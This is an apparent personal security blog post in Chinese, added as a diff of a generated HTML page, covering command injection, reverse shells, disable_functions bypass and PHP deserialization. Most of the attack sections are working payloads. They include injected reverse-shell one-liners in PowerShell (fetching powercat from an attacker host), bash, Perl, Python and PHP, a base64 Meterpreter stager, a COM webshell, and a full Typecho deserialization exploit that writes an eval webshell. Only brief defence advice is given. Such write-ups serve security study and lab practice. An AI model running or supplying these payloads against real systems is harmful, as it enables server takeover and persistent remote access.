@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="/img/marmot.jpg">
+    <link rel="alternate" type="application/atom+xml" title="marmot" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        命令执行及反序列化｜marmot&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.marmot.vip/command/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
+
+    <!-- Pygments Github CSS -->
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('img/back.jpg')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    marmot
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/Tags/">Tags</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/work/">work</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="undefined/img/back6.jpg">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('/img/back6.jpgundefined')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>命令执行及反序列化</h1>
+                    
+                    <h2 class="subheading">男儿百年且荣身，何须徇节甘风尘。</h2>
+                    
+                    <span class="meta">
+                         作者 marmot
+                        <span>
+                          日期 2021-08-06
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#command"
+                           title="command">command</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            命令执行及反序列化
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>代码层过滤不严，应用程序之间或间接使用了动态执行命令的危险函数。函数的运行参数可控。</p>
+<p>系统命令执行函数</p>
+<p>system(),exec(),shell_exec(),popen,``,passthru()</p>
+<p>危害：</p>
+<ol>
+<li>继承web服务器程序权限，执行系统命令</li>
+<li>继承web服务器权限，读取文件</li>
+<li>反弹shell</li>
+<li>控制网站</li>
+<li>控制服务器</li>
+</ol>
+<p>防御：</p>
+<ol>
+<li>尽量少使用命令执行函数，或者disable_functions</li>
+<li>对参数进行过滤</li>
+</ol>
+<p>system()有回显</p>
+<p>exec()无回显</p>
+<p>shell_exec()无回显</p>
+<p>passthru()有回显</p>
+<p>echo <code>`whoami`</code></p>
+<p>漏洞利用：</p>
+<p>​    继承web用户权限，在服务器中执行任意命令</p>
+<p>linux</p>
+<p>​    echo  ‘<?php phpinfo();?>‘ &gt; 2.php</p>
+<p>​    echo “<?php phpinfo();?>“ &gt; 3.php</p>
+<p>windows</p>
+<p>​    echo ‘<?php phpinfo();?>‘ &gt; 4.php</p>
+<p>windows命令执行语法</p>
+<p>​    command &amp;  后台执行命令   </p>
+<p>   command &amp; command2  都执行</p>
+<p>​    command &amp;&amp; command2  只有1执行成功才执行命令2</p>
+<p>   command | command2 将第一条命令的结果传递给命令2</p>
+<p>  command || command2 只有第一条失败才执行命令2</p>
+<p>Linux命令语法</p>
+<pre><code> command1;command2   先后执行命令1，2 无论是否成功
+</code></pre>
+<p>​    command1&amp;command2   后台执行1后执行2</p>
+<p>​    command1&amp;&amp;command2  1成功执行2</p>
+<p>​    command1|command2   管道符  </p>
+<p>​    command||command2     1失败才执行2</p>
+<p>   ``优先执行反引号命令</p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>​    反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<p>在目标服务器进行执行命令时，通过网络获取一个交互式的命令中希环境</p>
+<p><strong>为什么要反弹shell？</strong></p>
+<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
+<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
+<p>有如下情况：</p>
+<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+<p>2.目标机器的ip动态改变，你不能持续控制。</p>
+<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
+<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
+<p>条件：</p>
+<ol>
+<li>攻击机</li>
+<li>服务器–公网服务器</li>
+<li>获取shell的服务器</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#反弹shell</span></span><br><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;http://192.168.21.66:8000/windows/powercat.ps1&#x27;</span>);powercat -c 192.168.21.107 -p 8888 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/command/image-20210727105942949.png" alt="image-20210727105942949"></p>
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>目标机器反弹</p>
+<p>反向</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">1.1.1.1&amp;powershell IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;http://192.168.21.107:9999/powercat.ps1&#x27;</span>);powercat -c 192.168.21.107 -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">监听机器</span><br><span class="line">nc -lnvp 8888</span><br></pre></td></tr></table></figure>
+
+
+
+<p>正向</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">1.1.1.1&amp;powershell IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;http://192.168.21.107:9999/powercat.ps1&#x27;</span>);powercat -l -p 9001 -e cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">nc 192.168.21.207 9001</span><br></pre></td></tr></table></figure>
+
+
+
+<p>bash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">1.1.1.1&amp;bash -i &gt;&amp; /dev/tcp/192.168.21.107/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">姿势一</span><br><span class="line"><span class="comment">#payload   </span></span><br><span class="line"></span><br><span class="line"><span class="number">1.1</span>.<span class="number">1.1</span>&amp;perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.21.107&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">nc -lnvp <span class="number">1234</span></span><br><span class="line"></span><br><span class="line">=================================================</span><br><span class="line">姿势二</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">1.1</span>.<span class="number">1.1</span>&amp;perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.21.107:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">nc -lnvp <span class="number">1234</span></span><br><span class="line"></span><br><span class="line">=================================================</span><br><span class="line">姿势三</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">1.1</span>.<span class="number">1.1</span>&amp;perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;192.168.21.107:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">nc -lnvp <span class="number">1234</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">姿势一</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.21.107&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">nc -lnvp <span class="number">1234</span></span><br><span class="line">=================================================</span><br><span class="line">姿势二</span><br><span class="line">python -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;192.168.21.107&#x27;,1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">攻击机</span><br><span class="line">nc -lnvp <span class="number">1234</span></span><br><span class="line">=================================================</span><br><span class="line">metasploit</span><br><span class="line">msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.90</span><span class="number">.1</span> LPORT=<span class="number">1234</span></span><br><span class="line"><span class="keyword">import</span> base64; <span class="built_in">exec</span>(base64.b64decode(<span class="string">&#x27;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg==&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.21.107&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">    </span><br><span class="line">攻击机</span><br><span class="line">nc -lnvp <span class="number">1234</span></span><br><span class="line">=================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="绕过disable_function"></a>绕过disable_function</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">姿势一</span><br><span class="line">LD_PRELOAD,是一个Linux下的环境变量，允许在程序运行前优先加载的动态链接库</span><br><span class="line">前提条件</span><br><span class="line"><span class="number">1</span>.可以上传自己的.so文件</span><br><span class="line"><span class="number">2</span>.可以控制环境变量的值</span><br><span class="line"><span class="number">3</span>.</span><br><span class="line"></span><br><span class="line">=================================================</span><br><span class="line">姿势二</span><br><span class="line">Apache+mod.cgi+.htaccess绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=================================================</span><br><span class="line">姿势三（限Windows）</span><br><span class="line">利用Windows com绕过</span><br><span class="line">条件</span><br><span class="line">php默认是不能调用外部组件的，这个需要手动开启，如果目标机开启了相关配置，这种绕过方法才能利用。首先在php.ini中添加扩展:</span><br><span class="line">extension=php_com_dotnet.dll</span><br><span class="line">然后将com.allow_dcom = <span class="literal">true</span>前面的分号去掉，取消注释：</span><br><span class="line">com.allow_dcom = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$command</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">	<span class="variable">$wsh</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">	<span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;exec(<span class="string">&quot;cmd.exe /c&quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">	<span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line">	<span class="variable">$stringput</span> = <span class="variable">$stdout</span>-&gt;ReadALL();</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$stringput</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/command/image-20210727155655118.png" alt="image-20210727155655118"></p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id><a href="#" class="headerlink" title></a></h3><p><img src="/command/image-20210727160000563.png" alt="image-20210727160000563"></p>
+<p>序列化的定义为将对象的状态信息转换为可以储存和传输的形式（字符串）的过程，对象将其状态写入到临时或永久存储区，之后可以在存储区读取或反序列化对象的状态，重新创建对象</p>
+<p>serialize($a);对 对象 进行序列化</p>
+<p>unserialize(); 对数据流进行反序列化</p>
+<h3 id="反序列化漏洞说明"><a href="#反序列化漏洞说明" class="headerlink" title="反序列化漏洞说明"></a>反序列化漏洞说明</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;User2&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#序列化后的数据</span></span><br><span class="line"></span><br><span class="line">类型:类名长度:类名:属性数量:&#123;(属性一)类型:(属性一)名称长度:(属性一)名称;(属性一)值类型:(属性一)值长度:(属性一)值;(其余属性相同)&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过__wakeup()方法"></a><strong>绕过__wakeup()方法</strong></h5><p>有当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行，即：</p>
+<p><code>O:4:&quot;Test&quot;:**2**:&#123;s:4:&quot;test&quot;;s:18:&quot;&lt;?php%20phpinfo();?&gt;&quot;;&#125;这种 你就会绕过__wakeup()，__wakeup()内部全都不会执行啦 不信你可以试试</code>）</p>
+<h3 id="反序列化漏洞案例"><a href="#反序列化漏洞案例" class="headerlink" title="反序列化漏洞案例"></a>反序列化漏洞案例</h3><p><a target="_blank" rel="noopener" href="http://ip/seri_evil.php?usr_serialized=O:9:%22FileClass%22:1:%7Bs:8:%22filename%22:s:11:%22/etc/passwd%22;%7D">http://ip/seri_evil.php?usr_serialized=O:9:%22FileClass%22:1:{s:8:%22filename%22:s:11:%22/etc/passwd%22;}</a></p>
+<p><img src="/command/image-20210727172512127.png" alt="image-20210727172512127"></p>
+<p><img src="/command/image-20210727172504852.png" alt="image-20210727172504852"></p>
+<p> 服务器接受COOKIE或者POST传递的__typecho_config参数</p>
+<p>进行base64解码 及反序列化 -》$config</p>
+<p>对参数$config[‘adapter’],$config[‘prefix’] 创建Typecho_Db对象</p>
+<p>创建对象的时候，使用了字符串拼接$config[‘adapter’],调用了__toString方法</p>
+<p>调用to_String方法中时候调用了$item[‘author’]-&gt;screenName的__get方法</p>
+<p>__get方法返回的是对象的get($screenName（属性）)方法</p>
+<p>get方法中又调用的_applyFilter($screenName);方法</p>
+<p> 此方法中对所有filter数组中的函数 对接收的value进行函数的执行</p>
+<p> 最后的结果为 assert(“file_put_contents(‘shell.php’, ‘<?php @eval($_POST[l]);?>‘)”)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$_type</span> = <span class="string">&#x27;ATOM 1.0&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$item</span></span>)</span>&#123;</span><br><span class="line">​     <span class="keyword">$this</span>-&gt;_items[] = <span class="variable">$item</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>(<span class="string">&#x27;screenName&#x27;</span>=&gt; <span class="string">&#x27;file_put_contents(\&#x27;shell.php\&#x27;, \&#x27;&lt;?php @eval($_POST[l]);?&gt;\&#x27;)&#x27;</span>);</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload1</span> = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload2</span> = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload1</span>-&gt;addItem(<span class="keyword">array</span>(<span class="string">&#x27;author&#x27;</span> =&gt; <span class="variable">$payload2</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>(<span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="variable">$payload1</span>, <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$exp</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构建payload</p>
+<p><img src="/command/clip_image002.jpg" alt="img"></p>
+<p>生成base64编码</p>
+<p>YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTk6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2xdKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9</p>
+<p>请求头中添加Referer字段</p>
+<p>Referer: <a target="_blank" rel="noopener" href="http://192.168.148.129/typecho/install.php?finish=1">http://192.168.148.129/typecho/install.php?finish=1</a></p>
+<p><img src="/command/clip_image004.jpg" alt="img"></p>
+<p>访问写入的shell.php</p>
+<p><img src="/command/clip_image006.jpg" alt="img"></p>
+<p><img src="/command/clip_image008.jpg" alt="img"></p>
+<p>蚁剑连接</p>
+<p><img src="/command/clip_image010.jpg" alt="img"></p>
+<h3 id="防御PHP反序列化漏洞"><a href="#防御PHP反序列化漏洞" class="headerlink" title="防御PHP反序列化漏洞"></a><strong>防御PHP反序列化漏洞</strong></h3><p>1.要严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则 2.要对于unserialize后的变量内容进行检查，以确定内容没有被污染</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/pikachu/" data-toggle="tooltip" data-placement="top"
+                           title="pikachu靶场的搭建及教程">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/XSS/" data-toggle="tooltip" data-placement="top"
+                           title="XSS注入攻击及绕过姿势">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+                    <!-- Valine -->
+                    <div class="vcomments"></div>
+                    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+                    <script src="//cdn.jsdelivr.net/npm/valine"></script>
+                    <script>
+                        var GUEST = ['nick','mail','link'];
+                        var meta = '';
+                        meta = meta.split(',').filter(function (item) {
+                            return GUEST.indexOf(item)>-1;
+                        });
+                        var notify = 'false' == true ? true : false;
+                        var verify = 'false' == true ? true : false;
+                        new Valine({
+                            el: '.vcomments',
+                            notify: notify,
+                            verify: verify,
+                            app_id: "oE8RJ9DO5Tl7ChTtMFwgLKIg-gzGzoHsz",
+                            app_key: "mUbPBB3Wq3R6wX9ysIlescWj",
+                            placeholder: "评论一下",
+                            avatar:"mm",
+                            meta:meta
+                        });
+                    </script>
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell"><span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perl"><span class="toc-text">perl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python"><span class="toc-text">python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-text">php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="toc-text">绕过disable_function</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E"><span class="toc-text">反序列化漏洞说明</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 